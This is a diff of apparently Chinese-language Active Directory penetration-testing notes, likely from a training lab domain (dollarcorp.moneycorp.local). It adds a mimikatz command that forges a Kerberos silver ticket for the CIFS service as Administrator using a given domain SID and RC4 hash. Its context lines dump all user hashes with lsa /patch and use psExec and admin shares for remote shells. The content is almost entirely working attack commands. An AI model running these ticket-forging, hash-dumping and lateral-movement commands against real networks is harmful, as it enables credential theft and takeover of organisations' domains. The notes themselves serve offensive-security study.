@@ -262,4 +262,7 @@ GetNPUser.py会完成以上操作。
     	misc::cmd
     	dir \\DESKTOP-1\c$
     	psExec.exe \\DESKTOP-1 cmd.exe
+	
+	create silver ticket 
+	kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt
   6、mimikatz.exe  dump所有用户hash   ::lsa /patch
